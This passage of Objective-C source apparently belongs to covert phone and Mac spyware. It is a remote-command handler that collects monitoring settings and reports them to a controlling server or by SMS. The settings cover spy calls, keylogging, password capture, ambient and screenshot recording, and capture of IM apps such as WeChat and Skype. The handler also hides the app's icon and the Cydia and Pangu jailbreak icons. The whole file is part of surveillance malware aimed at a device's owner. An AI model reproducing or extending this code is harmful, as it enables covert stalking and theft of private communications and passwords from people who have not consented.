		[element setMSettingValue:watchOptions];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
		
		DLog (@"watchOptions = %@", watchOptions);

		
		DLog(@"-15.2- watch number")
		NSString *watchNumberString = [self displayStringWithNumberArray:[prefWatchList mWatchNumbers] 
														   remoteCommand:kRemoteCmdWatchNumbers];		
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdWatchNumbers];
		[element setMSettingValue:watchNumberString];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}	
			
	// -- Location timer
	if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		DLog (@"-16-")
		NSInteger locationTimer = [RemoteCmdProcessorUtils locationForTimeInterval:[prefLocation mLocationInterval]];		
		element					= [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSetLocationTimer];
		[element setMSettingValue:[NSString stringWithFormat:@"%ld", (long)locationTimer]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Panic mode
	if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
		DLog (@"-17-")
		NSString *panicMode = [NSString string];
		if ([prefPanic mLocationOnly]) {		// Location only
			panicMode = @"2";
		} else {								// Location and Image
			panicMode = @"1";
		}		
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdPanicMode];
		[element setMSettingValue:panicMode];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Notification Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_NotificationNumbers]) {		
		DLog (@"-18-")
		NSString *notificationNumberString = [self displayStringWithNumberArray:[prefNotificationNumberList mNotificationNumbers] 
																  remoteCommand:kRemoteCmdNotificationNumbers];											  
		DLog (@"notification number %@", notificationNumberString);
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdNotificationNumbers];
		[element setMSettingValue:notificationNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
	}
	// -- Home Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {		
		DLog (@"-19-")
		NSString *homeNumberString = [self displayStringWithNumberArray:[prefHomeNumberList mHomeNumbers] 
																  remoteCommand:kRemoteCmdHomeNumbers];											  
		DLog (@"home number %@",[prefHomeNumberList mHomeNumbers] );
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdHomeNumbers];
		[element setMSettingValue:homeNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
	}
	// -- CIS Number kRemoteCmdCISNumbers
	// -- Monitor Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]) {		
		DLog (@"-20-")
		NSString *monitorNumberString = [self displayStringWithNumberArray:[prefMonitor mMonitorNumbers] 
														  remoteCommand:kRemoteCmdMonitorNumbers];											  
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdMonitorNumbers];
		[element setMSettingValue:monitorNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
		
		DLog (@"monitorNumberString = %@", monitorNumberString);
	}
	// -- Enable spycall
	if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]) {
		DLog (@"-21-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableSpyCall];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefMonitor mEnableMonitor]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Enable FaceTime Spycall
	if ([configurationManager isSupportedFeature:kFeatureID_SpyCallOnFacetime]) {
		DLog (@"-21.1-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableSpyCallOnFacetime];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefMonitorFacetimeID mEnableMonitorFacetimeID]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}	
	//-- FaceTime ID
	if ([configurationManager isSupportedFeature:kFeatureID_SpyCallOnFacetime]) {
		DLog (@"-21.2-")				
		// Example of Facetime ID i.e. 65:66812345678;facetimeid@gmail.com
		NSString *monitorFacetimeIDString = [self displayStringWithNumberArray:[prefMonitorFacetimeID mMonitorFacetimeIDs] 
																 remoteCommand:kRemoteCmdFaceTimeIDs];				
		
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdFaceTimeIDs];
		[element setMSettingValue:monitorFacetimeIDString];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
		
		DLog (@"mMonitorFacetimeIDs = %@", monitorFacetimeIDString);
	}	
	
	// -- Enable restriction
	if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog (@"-22-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableRestrictions];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefRestriction mEnableRestriction]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Address book mode management
	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		DLog (@"-23-")
		NSInteger mode = 0;
		DLog (@"%lu",(unsigned long)[prefRestriction mAddressBookMgtMode])
		switch ([prefRestriction mAddressBookMgtMode]) {
			case kAddressMgtModeOff:
				mode = 0;
				break;
			case kAddressMgtModeMonitor:
				mode = 1;
				break;
			case kAddressMgtModeRestrict:
				mode = 2;
				break;
		}
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAddressBookManagementMode];
		[element setMSettingValue:[NSString stringWithFormat:@"%ld", (long)mode]];	// 0, 1, or 2
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- vcard version
	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		DLog (@"-24-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdVCARD_VERSION];
		[element setMSettingValue:kVCardVersion];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Enable application profile
	if ([configurationManager isSupportedFeature:kFeatureID_ApplicationProfile]) {
		DLog (@"-25-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEanbleApplicationProfile];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefRestriction mEnableAppProfile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Enable url profile
	if ([configurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile]) {
		DLog (@"-26-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableUrlProfile];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefRestriction mEnableUrlProfile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Emergency Numbers
	if ([configurationManager isSupportedFeature:kFeatureID_EmergencyNumbers]) {		
		DLog (@"-Emergency Number-")
		NSString *emergencyNumberString = [self displayStringWithNumberArray:[prefEmergencyNumberList mEmergencyNumbers] 
															   remoteCommand:kRemoteCmdEmergencyNumbers];											  
		DLog (@"Emergency %@",[prefEmergencyNumberList mEmergencyNumbers]);
		
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEmergencyNumbers];
		[element setMSettingValue:emergencyNumberString];
		[settingElementArray addObject:element];	
		[element release];
		element = nil;
	}
	//-- Waiting for approval policy
	if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		DLog (@"-27-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEnableWaitingForApprovalPolicy];
		//DLog (@"Send wait policy back to server %d", ![prefRestriction mWaitingForApprovalPolicy])
		[element setMSettingValue:[NSString stringWithFormat:@"%d", ![prefRestriction mWaitingForApprovalPolicy]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Calendar
	if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
		DLog (@"-28-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdCalendar];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCalendar]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Note
	if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
		DLog (@"-29-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdNote];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableNote]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Keywords
	if ([configurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSString *smsKeywords = [self displayStringWithNumberArray:[prefKeywords mKeywords] 
													 remoteCommand:kRemoteCmdSMSKeywords];
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSMSKeywords];
		[element setMSettingValue:smsKeywords];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- VoIP
	if ([configurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
		DLog (@"SettingEvent --> VoIP")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdVoIP];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableVoIPLog]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	//-- Delivery method
	DLog (@"SettingEvent --> Delivery method")
	element = [[FxSettingsElement alloc] init];
	[element setMSettingId:kRemoteCmdDeliveryMethod];
	[element setMSettingValue:[NSString stringWithFormat:@"%lu", (unsigned long)[prefEvents mDeliveryMethod]]];
	[settingElementArray addObject:element];
	[element release];
	element = nil;
	
	//-- KeyLog
	if ([configurationManager isSupportedFeature:kFeatureID_EventKeyLog]) {
		DLog (@"SettingEvent --> KeyLog")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdKeyLog];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableKeyLog]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- Page visited
	if ([configurationManager isSupportedFeature:kFeatureID_EventPageVisited]) {
		DLog (@"SettingEvent --> PageVisited")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdPageVisited];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnablePageVisited]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- Password
	if ([configurationManager isSupportedFeature:kFeatureID_EventPassword]) {
		DLog (@"SettingEvent --> Password")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdPassword];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnablePassword]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    // -- Mac OS IM
	if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSIM]) {
		DLog (@"-6-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIMAppShot];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableIM]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        
        element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIMAppShotLINE];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotLINE) == kPrefIMIndividualAppShotLINE]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        
        element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIMAppShotSkype];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotSkype) == kPrefIMIndividualAppShotSkype]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        
        element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIMAppShotQQ];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotQQ) == kPrefIMIndividualAppShotQQ]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdIMAppShotIMessage];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotIMessage) == kPrefIMIndividualAppShotIMessage]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdIMAppShotWeChat];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotWeChat) == kPrefIMIndividualAppShotWeChat]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdIMAppShotAIM];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotAIM) == kPrefIMIndividualAppShotAIM]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdIMAppShotTrillian];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotTrillian) == kPrefIMIndividualAppShotTrillian]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdIMAppShotViber];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualAppShotViber) == kPrefIMIndividualAppShotViber]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    //-- USB Connection
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSUSBConnection]) {
		DLog (@"SettingEvent --> Usb connection")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdUsbConnection];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableUSBConnection]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- File transfer
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSFileTransfer]) {
		DLog (@"SettingEvent --> File transfer")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdFileTransfer];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableFileTransfer]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- Mac OS email
    if ([configurationManager isSupportedFeature:kFeatureID_EVentMacOSEmail]) {
		DLog (@"SettingEvent --> Mac OS email")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEmailAppShot];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableEmail]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- Mac OS PrintJob
    if ([configurationManager isSupportedFeature:kFeatureID_EventPrintJob]) {
        DLog (@"SettingEvent --> Mac OS PrintJob")
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdPrintJob];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnablePrintJob]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    //-- Mac OS AppScreenShot
//    if ([configurationManager isSupportedFeature:kFeatureID_EventAppScreenShot]) {
//        DLog (@"SettingEvent --> Mac OS AppScreenShot")
//        element = [[FxSettingsElement alloc] init];
//        [element setMSettingId:kRemoteCmdAppScreenShot];
//        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableAppScreenShot]]];
//        [settingElementArray addObject:element];
//        [element release];
//        element = nil;
//    }
    
    //-- Application usage
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSAppUsage]) {
		DLog (@"SettingEvent --> Application usage")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAppUsage];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableAppUsage]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- Mac OS logon
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSLogon]) {
		DLog (@"SettingEvent --> Mac OS logon")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdLogon];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableLogon]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    //-- Application Visibility
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) {
		DLog (@"SettingEvent --> Application Visibility")
        element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdApplicationIconVisibility];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefVisibility mVisible]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
    }
    
    BOOL isCydiaVisible = YES;
    BOOL isPanguVisible = YES;
    for (Visible *visible in [prefVisibility mVisibilities]) {
        if ([[visible mBundleIdentifier] isEqualToString:@"com.saurik.Cydia"]) {               // -- Cydia
            if (![visible mVisible]) isCydiaVisible = NO;
        } else if ([[visible mBundleIdentifier] isEqualToString:@"io.pangu.loader"]) {         // -- Pangu
            if (![visible mVisible]) isPanguVisible = NO;
        }
    }
#if TARGET_OS_IPHONE
    //-- Cydia Visibility
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) { // Use feature of hide application icon
        DLog (@"SettingEvent --> Cydia Visibility")
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdCydiaIconVisibility];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", isCydiaVisible]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }

    //-- Pangu Visibility
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) { // Use feature of hide application icon
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
            DLog (@"SettingEvent --> Pangu Visibility")
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdPanguIconVisibility];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", isPanguVisible]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
    }
#endif
    // -- Temporal control ambient record
    if ([configurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
        DLog (@"SettingEvent --> Temporal control ambient record")
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdTemporalControlAmbientRecord];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableTemporalControlAR]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    // -- Temporal control screenshot record
    if ([configurationManager isSupportedFeature:kFeatureID_ScreenRecording]) {
        DLog (@"SettingEvent --> Temporal control screenshot record")
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdTemporalControlScreenshotRecord];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableTemporalControlSSR]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    
    // -- Temporal control network traffic
    if ([configurationManager isSupportedFeature:kFeatureID_EventNetworkTraffic]) {
        DLog (@"SettingEvent --> Temporal control of monitor network traffic: %d",[prefEvents mEnableTemporalControlNetworkTraffic] );
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdTemporalControlNetworkTraffic];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableTemporalControlNetworkTraffic]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    // -- IM Attachement limit size
    if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
        DLog (@"SettingEvent --> IM Attachment limit size")
        
        BOOL isSupport = [configurationManager isSupportedSettingID:kRemoteCmdIMAttachmentLimitSize
                                                        remoteCmdID:kRemoteCmdCodeSetSettings];

        if (isSupport) {
            
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMAttachmentLimitSize];
            
            // Image;Audio;Video;Non-media
            NSString *imAttachmentLimitsize = @"%d;%d;%d;%d";
                                
            imAttachmentLimitsize = [NSString stringWithFormat:imAttachmentLimitsize,
                                     [prefEvents mIMAttachmentImageLimitSize],
                                     [prefEvents mIMAttachmentAudioLimitSize],
                                     [prefEvents mIMAttachmentVideoLimitSize],
                                     [prefEvents mIMAttachmentNonMediaLimitSize]];
            
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMAttachmentLimitSize];
            [element setMSettingValue:imAttachmentLimitsize];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
            
            DLog (@"imAttachmentLimitsize = %@", imAttachmentLimitsize);
        }
    }
    
    // -- Debug log, Firefox extension
    if ([configurationManager isSupportedFeature:kFeatureID_EVentMacOSEmail]) { // kFeatureID_EVentMacOSEmail indicator for KnowIT Mac
        //
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdDebugLog];
        [element setMSettingValue:[NSString stringWithFormat:@"%d",[prefSignup mEnableDebugLog]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        //
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdInstallFirefoxExtension];
        [element setMSettingValue:NSLocalizedString(@"kInstalled", @"")];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    //=====================  File activity
    
    if ([configurationManager isSupportedFeature:kFeatureID_EventFileActivity]) {
        //
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdFileActivity];
        [element setMSettingValue:[NSString stringWithFormat:@"%d",[prefFileActivity mEnable]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
      
        NSUInteger fileActivityType = [prefFileActivity mActivityType];

        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdMonitoredFileActivityType];
        [element setMSettingValue:[NSString stringWithFormat:@"%lu",(unsigned long)fileActivityType]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        // Excluded paths
        NSString *excludedPaths = nil;
        if ([[prefFileActivity mExcludedFileActivityPaths] count]) {
            excludedPaths = [[prefFileActivity mExcludedFileActivityPaths] componentsJoinedByString:@";"];
        } else {
            excludedPaths = NSLocalizedString(@"kNone", @"");
        }
        
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdExcludedFileActivityPaths];
        [element setMSettingValue:excludedPaths];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
    // -- Network connection status
    if ([configurationManager isSupportedFeature:kFeatureID_EventNetworkConnection]) {
        DLog (@"SettingEvent --> Network connection status")
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdNetworkConnection];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableNetworkConnection]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
    }
    
	// -- create Setting event
	FxSettingsEvent *fxSettingEvents = [[FxSettingsEvent alloc] init];
	[fxSettingEvents setMSettingArray:settingElementArray];
	[fxSettingEvents setDateTime:[DateTimeFormat phoenixDateTime]];
	// -- send Setting event
	id eventDelegate = [[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate];
	if ([eventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"!!!!!! sending Setting Event to the server")
		[eventDelegate performSelector:@selector(eventFinished:) withObject:fxSettingEvents];
	}		
	[fxSettingEvents release];
	fxSettingEvents = nil;
}

/**
 - Method name: displayStringWithItems:andCaption
 - Purpose:This method is used to append display string
 - Argument list and description: aItems(NSArray),aCaption(NSString)
 - Return description: aCaption (NSString) 
*/

+ (NSString *) displayStringWithItems: (NSArray *) aItems andCaption:(NSString *)aCaption {
	NSString *itemString=@"";
	for (int index=0;index<[aItems count]; index++) {
		if (index==[aItems count]-1) 
			itemString=[NSString stringWithFormat:@"%@%@",itemString,[aItems objectAtIndex:index]];
		else {
		    itemString=[NSString stringWithFormat:@"%@%@, ",itemString,[aItems objectAtIndex:index]];	
		}
    }
	if ([itemString length]) {
		itemString = [NSString stringWithFormat:@"[%@]", itemString];
		aCaption=[aCaption stringByAppendingString:itemString];
	}
	else {
		aCaption= [aCaption stringByAppendingString:NSLocalizedString(@"kNone", @"")];
	}
	return aCaption;
}

/**
 - Method name:			displayStringWithNumberArray:remoteCommand
 - Purpose:				This method is used to append display string
 - Argument list and description: aNumberArray(NSArray), remoteCommand(NSInteger)
 - Return description:	formattedNotificationNumberString (NSString) 
 */

- (NSString *) displayStringWithNumberArray: (NSArray *) aNumberArray remoteCommand: (NSInteger) aRemoteCommand {
	// -- Number formatting e.g., 0811111111;0822222222;0833333333
	NSString *formattedNumberString = @"";
	for (int index = 0; index < [aNumberArray count]; index++) {
		if (index == [aNumberArray count] - 1)						// the last number in array
			formattedNumberString = [NSString stringWithFormat:@"%@%@", formattedNumberString, [aNumberArray objectAtIndex:index]];  // e.g., 48:0811111111
		else														// non-last number in array
		    formattedNumberString = [NSString stringWithFormat:@"%@%@;", formattedNumberString, [aNumberArray objectAtIndex:index]]; // e.g., 48:0811111111;0812222222;		
    }	
	DLog (@"final formattedNumberString = %@", formattedNumberString)
	return formattedNumberString;
}
/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult: (NSString *) aResult {
	DLog (@"RequestSettingsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *requestSettingsMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:requestSettingsMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {	
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:requestSettingsMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

-(void) dealloc {
	[super dealloc];
}


@end
